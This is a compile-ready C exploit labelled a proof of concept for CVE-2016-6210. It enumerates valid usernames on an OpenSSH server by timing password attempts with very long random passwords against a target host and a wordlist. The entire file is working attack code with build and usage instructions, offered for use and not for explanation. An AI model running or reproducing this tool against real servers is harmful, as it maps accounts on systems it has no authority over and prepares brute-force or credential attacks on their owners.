// gcc ssh_enum.c -I/usr/local/include -L/usr/local/lib -lm -lssh -pthread -o ssh_enum
// Proof of concept for [CVE-2016-6210]
#include <errno.h>
#include <math.h>
#include <time.h>
#include <sys/time.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <pthread.h>
#include <libssh/libssh.h>
#include <openssl/blowfish.h>
#include <openssl/rsa.h>
#include <openssl/engine.h>

#define PORT 22
#define TRIALS 10 // Amount of times to retry with the invalid username (and long random passwords)
#define TIMEOUT 3 // Seconds to time out, and disregard data.
#define MAX_LEN 256 // Max length for usernames and hostname.
#define PASS_LEN 50000 // Password shit to send to ssh client.
#define THREAD_COUNT 5
#define LIBSSH_STATIC 1

pthread_attr_t attr;
char password[PASS_LEN];
int port = 0;
pthread_t threads[THREAD_COUNT];
char hostname[MAX_LEN] = {0};
char *invalid_user[] = {"BL00BURRY", "r0xXxy", "www", "operator"}; // For invalid timestamps.
float invalid_user_avg = 1;
float system_user_avg = 1;

struct thread_data { char username[MAX_LEN]; };
struct thread_data *t_data;

void usage(char *);
void die(ssh_session);
void *user_check(void *);

uint64_t get_posix_clock_time(){
    struct timespec ts;
    if (clock_gettime (CLOCK_MONOTONIC, &ts) == 0)
        return (uint64_t) (ts.tv_sec * 1000000 + ts.tv_nsec / 1000);
    else
        return 0;
}
 
int main(int argc, char *argv[]){
    if(argc != 3)
        usage(argv[0]);
    
    pthread_t scan_t[THREAD_COUNT];
    t_data = (struct thread_data *) calloc(sizeof(struct thread_data)*THREAD_COUNT, 1);
    
    unsigned long long int p;
    int x;
    char buff[MAX_LEN], *pos;
    uint64_t prev_time_value, time_value, time_diff;
    float user_avg[4] = {1};

    FILE *user_list = fopen(argv[2], "r");
    if(!user_list){
        fputs("Error opening file.\n", stderr);
        return -1;
    }
    
    pos = argv[1];
    for(x=0;*pos && *pos != ':';pos++,x++){} // Push upto the : if needed.
    strncpy(hostname, argv[1], (x>=MAX_LEN)?MAX_LEN-1:x); // Copy the hostname.
    
    if(*pos++ == ':' && *pos) port = atoi(pos); // Calculate the port.
    if(!port) port = PORT; // Maybe the user entered non-digits, so default.
    ssh_session ssh_sesh;
    // Compute average times for invalid usernames.
    int y;
    for(y=0;y<TRIALS;y++)
      for(x=0;x<4;x++){
          // THREAD THIS!
          int p;
          for(p=0;p<PASS_LEN;p++)
            password[p] = rand()%255;
          ssh_sesh = ssh_new(); // Make a new ssh object.
          if(!ssh_sesh) return -1;
          ssh_options_set(ssh_sesh, SSH_OPTIONS_HOST, hostname); // Set hostname.
          ssh_options_set(ssh_sesh, SSH_OPTIONS_PORT, &port); // Set the port.
          ssh_options_set(ssh_sesh, SSH_OPTIONS_USER, invalid_user[x]); // Set the username.
          ssh_connect(ssh_sesh); // Check to see if invalid user was returned?

          prev_time_value = get_posix_clock_time();
          ssh_userauth_password(ssh_sesh, invalid_user[x], password);
          time_value = get_posix_clock_time();
          time_diff = time_value - prev_time_value;

          user_avg[x] += time_diff;
          user_avg[x] /= 2;
          ssh_disconnect(ssh_sesh);
          ssh_free(ssh_sesh);
      }
    pthread_attr_init(&attr);
    // Make this more sound somehow, better mathz?
    if(user_avg[0] > user_avg[1]) // For lower trials, use 1000 and not 2000
      invalid_user_avg = user_avg[0]+(2000-((int)user_avg[0]%1000));
    else
      invalid_user_avg = user_avg[1]+(2000-((int)user_avg[1]%1000));

    if(user_avg[2] > user_avg[3])
      system_user_avg = floor(user_avg[2]);
    else
      system_user_avg = floor(user_avg[3]);

    printf("Invalid user threshold: %.02f\n", invalid_user_avg);
    for(x=0;x<4;x++)
      printf("%s - %.04f\n", invalid_user[x], user_avg[x]);
  
    unsigned int thread_count = 0;  
    int n;
    while(fgets(buff, sizeof(buff), user_list) != NULL){ // While not at the end of the file.
      if(thread_count == THREAD_COUNT){ // Wait for threads to join
        for(n=0;n<THREAD_COUNT;n++){
          pthread_join(scan_t[n], NULL);
          thread_count--;
        }
      }
      memset(&t_data[thread_count], 0, sizeof(struct thread_data));
      strncpy((char *)&t_data[thread_count], buff, strlen(buff)-1); // Remove newline
      pthread_create(&scan_t[thread_count], NULL, user_check, (void *) &t_data[thread_count++]);
    }
    for(n=0;n<THREAD_COUNT;n++)
      pthread_join(scan_t[n], NULL);
    
    fclose(user_list);
    free(t_data);
    return 0;
}

void *user_check(void *data){
    float avg_check = 1;
    struct thread_data *tmp = (struct thread_data *) data;
    uint64_t prev_time, after_value, t_diff;
    ssh_session ssh_sesh;
    int n;
    for(n=0;n<TRIALS;n++){
      int p;
      for(p=0;p<PASS_LEN;p++)
        password[p] = rand()%255;

      ssh_sesh = ssh_new(); // Make a new ssh object.
      if(!ssh_sesh) pthread_exit(NULL);            
      ssh_options_set(ssh_sesh, SSH_OPTIONS_HOST, hostname); // Set hostname.
      ssh_options_set(ssh_sesh, SSH_OPTIONS_PORT, &port); // Set the port.
      ssh_options_set(ssh_sesh, SSH_OPTIONS_USER, tmp->username); // Set the username.
      
      ssh_connect(ssh_sesh);
      prev_time = get_posix_clock_time();
      ssh_userauth_password(ssh_sesh, tmp->username, password);
      after_value = get_posix_clock_time();
      t_diff = after_value-prev_time;
      avg_check += t_diff;
      avg_check /= 2;
      ssh_disconnect(ssh_sesh);
      ssh_free(ssh_sesh);
    }
    
    printf("%.02f - diff - %s\n", avg_check, tmp->username);
    if(avg_check < system_user_avg)
      printf("User: %s exists on the system. But may have no login.\n", tmp->username);
    else if(avg_check > invalid_user_avg)
      printf("%s exists on the system.\n", tmp->username);
    pthread_exit(NULL);
}

void usage(char *pro){
    fprintf(stderr, "Usage is: %s HOST[:port] USER_LIST.txt\n", pro);
    fputs("User list must contain one username per line.\n", stderr);
    exit(1);
}
